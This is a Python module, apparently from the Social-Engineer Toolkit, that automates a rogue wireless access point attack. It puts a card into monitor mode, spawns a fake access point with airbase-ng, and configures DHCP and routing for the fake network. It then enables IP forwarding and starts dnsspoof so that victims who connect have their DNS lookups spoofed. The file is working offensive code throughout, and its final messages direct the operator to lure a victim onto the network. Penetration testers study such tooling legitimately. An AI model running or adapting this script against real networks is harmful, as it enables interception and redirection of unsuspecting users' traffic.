#!/usr/bin/env python
##############################################
#
# This is a basic setup for an access point
# attack vector in set.
#
##############################################

import sys
import os
import subprocess
import re
import pexpect
import time
from src.core.setcore import *
from src.core.menu import text

# grab configuration options here
#fileopen=file("config/set_config", "r")
#for line in fileopen:
#    line=line.rstrip()
#    # look for airbase path
#    match=re.search("AIRBASE_NG_PATH=", line)
#    if match: 
#        airbase_path = line.replace("AIRBASE_NG_PATH=", "")
#        if not os.path.isfile(airbase_path):
#            if os.path.isfile("/usr/local/sbin/airbase-ng"): airbase_path = "/usr/local/sbin/airbase-ng"
#
#    # look for access point ssid
#    match1=re.search("ACCESS_POINT_SSID=", line)
#    if match1: access_point = line.replace("ACCESS_POINT_SSID=", "")
#
#    # grab access point channel
#    match2=re.search("AP_CHANNEL=", line)
#    # if we hit on AP_CHANNEL in set_config
#    if match2:
#        # replace line and define ap_channel
#        ap_channel = line.replace("AP_CHANNEL=", "")
#        # default if not found
#        if ap_channel == "": ap_channel = "9"
#
#    # look for dnsspoof
#    match3=re.search("DNSSPOOF_PATH=", line)
#    if match3: dnsspoof_path = line.replace("DNSSPOOF_PATH=", "")

from config.set_config import AIRBASE_NG_PATH as airbase_path
from config.set_config import ACCESS_POINT_SSID as access_point
from config.set_config import AP_CHANNEL as ap_channel
from config.set_config import DNSSPOOF_PATH as dnsspoof_path

if not os.path.isfile(dnsspoof_path):
   print_warning("DNSSpoof was not found. Please install or correct path in set_config. Exiting....")
   exit_set()

if not os.path.isfile(airbase_path):
    airbase_path = "src/wireless/airbase-ng"
    print_info("using SET's local airbase-ng binary") 

print_info("For this attack to work properly, we must edit the dhcp3-server file to include our wireless interface.")
print_info("""This will allow dhcp3 to properly assign IPs. (INTERFACES="at0")""")
print("")
print_status("SET will now launch nano to edit the file.")
print_status("Press ^X to exit nano and don't forget to save the updated file!")
print_warning("If you receive an empty file in nano, please check the path of your dhcp3-server file!")
return_continue()
subprocess.Popen("nano /etc/default/dhcp3-server", shell=True).wait()

# DHCP SERVER CONFIG HERE
dhcp_config1 = ("""
ddns-update-style none;
authoritative;
log-facility local7;
subnet 10.0.0.0 netmask 255.255.255.0 {
    range 10.0.0.100 10.0.0.254;
    option domain-name-servers 8.8.8.8;
    option routers 10.0.0.1;
    option broadcast-address 10.0.0.255;
    default-lease-time 600;
    max-lease-time 7200;
}
""")

dhcp_config2 = ("""
ddns-update-style none;
authoritative;
log-facility local7;
subnet 192.168.10.0 netmask 255.255.255.0 {
    range 192.168.10.100 192.168.10.254;
    option domain-name-servers 8.8.8.8;
    option routers 192.168.10.1;
    option broadcast-address 192.168.10.255;
    default-lease-time 600;
    max-lease-time 7200;
}
""")

show_fakeap_dhcp_menu = create_menu(text.fakeap_dhcp_text, text.fakeap_dhcp_menu)
fakeap_dhcp_menu_choice = raw_input(setprompt(["8"], ""))

if fakeap_dhcp_menu_choice != "":
    fakeap_dhcp_menu_choice = check_length(fakeap_dhcp_menu_choice,2)
    # convert it to a string
    fakeap_dhcp_menu_choice = str(fakeap_dhcp_menu_choice)
    
if fakeap_dhcp_menu_choice == "":
    fakeap_dhcp_menu_choice = "1"

if fakeap_dhcp_menu_choice == "1":
    # writes the dhcp server out
    print_status("Writing the dhcp configuration file to src/program_junk")
    filewrite=file("src/program_junk/dhcp.conf", "w")
    filewrite.write(dhcp_config1)
    # close the file
    filewrite.close()
    dhcptun = 1

if fakeap_dhcp_menu_choice == "2":
    # writes the dhcp server out
    print_status("Writing the dhcp configuration file to src/program_junk")
    filewrite=file("src/program_junk/dhcp.conf", "w")
    filewrite.write(dhcp_config2)
    # close the file
    filewrite.close()
    dhcptun = 2

if fakeap_dhcp_menu_choice == "exit":
    exit_set()

interface = raw_input(setprompt(["8"], "Enter the wireless network interface (ex. wlan0)"))

# place wifi interface into monitor mode
print_status("Placing card in monitor mode via airmon-ng..")

# if we have it already installed then don't use the SET one
if os.path.isfile("/usr/local/sbin/airmon-ng"):
    airmonng_path = "/usr/local/sbin/airmon-ng"

if not os.path.isfile("/usr/local/sbin/airmon-ng"):
    airmonng_path = "src/wireless/airmon-ng"

monproc = subprocess.Popen("%s start %s |  grep \"monitor mode enabled on\" | cut -d\" \" -f5 | sed -e \'s/)$//\'" % (airmonng_path,interface), shell=True, stdout=subprocess.PIPE)
moniface=monproc.stdout.read()
monproc.wait()

# execute modprobe tun
subprocess.Popen("modprobe tun", shell=True).wait()

# create a fake access point
print_status("Spawning airbase-ng in a seperate child thread...")
child = pexpect.spawn('%s -P -C 20 -e "%s" -c %s %s' % (airbase_path,access_point,ap_channel,moniface))
print_info("Sleeping 15 seconds waiting for airbase-ng to complete...")
time.sleep(15)

# bring the interface up
if dhcptun==1:
    print_status("Bringing up the access point interface...")
    subprocess.Popen("ifconfig at0 up", shell=True).wait()
    subprocess.Popen("ifconfig at0 10.0.0.1 netmask 255.255.255.0", shell=True).wait()
    subprocess.Popen("ifconfig at0 mtu 1400", shell=True).wait()
    subprocess.Popen("route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1", shell=True).wait()

if dhcptun==2:
    print_status("Bringing up the access point interface...")
    subprocess.Popen("ifconfig at0 up", shell=True).wait()
    subprocess.Popen("ifconfig at0 192.168.10.1 netmask 255.255.255.0", shell=True).wait()
    subprocess.Popen("ifconfig at0 mtu 1400", shell=True).wait()
    subprocess.Popen("route add -net 192.168.10.0 netmask 255.255.255.0 gw 192.168.10.1", shell=True).wait()

# starts a dhcp server
print_status("Starting the DHCP server on a seperate child thread...")
child2 = pexpect.spawn("dhcpd3 -q -cf src/program_junk/dhcp.conf -pf /var/run/dhcp3-server/dhcpd.pid at0")

# starts ip_forwarding
print_status("Starting IP Forwarding...")
child3 = pexpect.spawn("echo 1 > /proc/sys/net/ipv4/ip_forward")

# start dnsspoof
print_status("Starting DNSSpoof in a seperate child thread...")
child4 = pexpect.spawn("%s -i at0" % (dnsspoof_path))

print_status("SET has finished creating the attack. If you experienced issues please report them.")
print_status("Now launch SET attack vectors within the menus and have a victim connect via wireless.")
print_status("Be sure to come back to this menu to stop the services once your finished.")
return_continue()
